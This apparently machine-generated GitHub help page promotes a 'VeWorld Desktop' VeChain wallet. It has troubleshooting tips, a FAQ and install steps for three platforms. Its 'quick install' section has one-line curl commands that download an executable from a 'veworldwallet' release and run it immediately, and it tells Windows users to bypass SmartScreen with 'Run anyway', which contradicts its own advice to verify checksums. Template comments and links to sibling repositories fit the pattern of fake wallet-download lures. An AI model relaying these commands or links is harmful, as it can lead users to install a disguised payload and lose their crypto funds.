![VeWorld Desktop](../assets/banner-article.png)

# VeChain Windows Wallet: Does VeWorld Desktop Work on Windows?

Install, permissions, and the first run on Windows

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> VeWorld Desktop is actively maintained; run the current release before treating a display problem as a wallet fault.

VeWorld Desktop runs on Windows as an installed application rather than a browser extension, and the current release page lists the builds it publishes. Most first-run problems on Windows come from permissions, antivirus interference or a data folder the app cannot write to, not from the wallet itself.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

You are choosing between platforms, or the installer completed but the app will not open, or it opens and cannot write its own data, or a security product quarantined the download.

| Symptom on Windows | Likely cause | First move |
|---|---|---|
| Installer blocked or deleted | Endpoint security quarantine | Check the vendor's quarantine log |
| App opens then closes | Missing dependency or blocked write | Run once as your own user, read the log |
| Blank window | Graphics or rendering issue | Update the OS and graphics driver |
| Data not saved between runs | Folder permissions | Check the app's data directory |
| <a href="https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md">Ledger not detected</a> | USB driver or charge-only cable | Try a data cable, direct port |

## Why it happens

Windows treats a downloaded application as untrusted until something vouches for it. Security products may quarantine a file that is perfectly genuine because it is new and uncommon, and an installer that never ran cannot be diagnosed from inside the app. That is why the first check after a failed install is the security product's own log rather than the wallet.

User permissions are the second cause. Applications that keep their data under the user profile can write freely; applications that try to write elsewhere need privileges they may not have. A wallet that cannot write its encrypted store behaves exactly like a wallet with no account, because it has nowhere to keep one.

USB is the third. A Ledger needs a data-capable cable and a port that can enumerate the device, and Windows power management may suspend a port that looks idle. Both produce a connected device that the app cannot see.

None of this changes what the app is for, and none of it touches the rule that matters most: never share <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md">your VeWorld Desktop recovery phrase</a>, whoever appears to be asking. On Windows it holds the same accounts as on any other platform, with the same freedom from a server, and the same requirement that you keep the recovery phrase offline.

## Fix

1. Download the installer from the project's GitHub releases page and confirm the published checksum before running it.
2. If a security product interferes, allow the specific file after verifying the checksum rather than disabling protection wholesale.
3. Run the installer as your own user, then launch the app once and let it finish first-run setup.
4. Create or import a wallet, and confirm the data persists by closing and reopening the app.
5. For a Ledger, use a data cable in a port on the machine itself, with the VeChain app open on the device.
6. If the window is blank, update Windows and the graphics driver before assuming a wallet fault.

## If that did not work

If the app will not start at all, check the Windows event log for the failure, which usually names a missing dependency. Reinstalling after a full uninstall is the quicker route once the phrase is confirmed.

If the app starts but never shows an account, its data directory may be read-only. Check permissions on that folder and confirm the account exists in it.

If the Ledger is visible in the operating system but not in the app, close any other wallet software, then retry with the coin app open.

## Prevention

- Verify the checksum of every download rather than trusting the source on appearance.
- Keep one data cable reserved for the device.
- Allow the application in your security product deliberately, by file, after verification.
- Keep the recovery phrase offline; reinstalling a Windows application is routine, losing a phrase is not.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### Is there a Windows version at all?

Yes. The wallet is published for Windows, macOS and Linux as an installed application, and the release page lists the current builds.

### Why did my antivirus remove the installer?

Because a new, uncommon binary can be quarantined on reputation rather than behaviour. Verify the checksum against the release page, then allow that file deliberately.

### Does the wallet need administrator rights?

It needs to write its own data, which normally lives in your user profile. Running everything elevated is unnecessary and worse practice than fixing the folder permission.

### Where does it keep wallet data?

In its own application data directory on the machine. That directory is what a backup of the machine would contain, which is another reason the phrase must exist separately.

### Can I use the same wallet on Windows and macOS?

Yes. Import the same recovery phrase on the second machine and the same address appears, because the address comes from the phrase rather than the platform.

### Does a Ledger work on Windows?

Yes, over USB with the VeChain app open, provided the cable carries data and the port is not suspended by power management.

### Will future releases support Windows?

The wallet is actively maintained and the release page is the place that lists the builds published for each platform.

### Does the wallet run on Windows 10 as well as 11?

The release page lists the builds published for each platform, and that listing is the accurate answer rather than a guess about versions. Check it before downloading.

### Why does the app ask to be allowed through the firewall?

Because it reads account state from the network. A wallet that cannot reach the network shows stale balances, which looks like a fault rather than a blocked connection.

### Can I run the wallet from a USB stick?

Installing to a removable drive is not the supported arrangement, and an unplugged stick mid-write risks the encrypted store. Install on the machine's own disk.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [What VeWorld Desktop is](https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-veworld-desktop.md)
- [Spotting a download that is not the published build](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/fake-crypto-wallet-app-vs-veworld-desktop.md)
- [Pairing a Ledger on a desktop machine](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md)
- [What a blank create screen means](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/create-vechain-wallet-blank-in-veworld-desktop.md)
- [How self-custody works in an installed app](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/is-veworld-wallet-safe-in-veworld-desktop.md)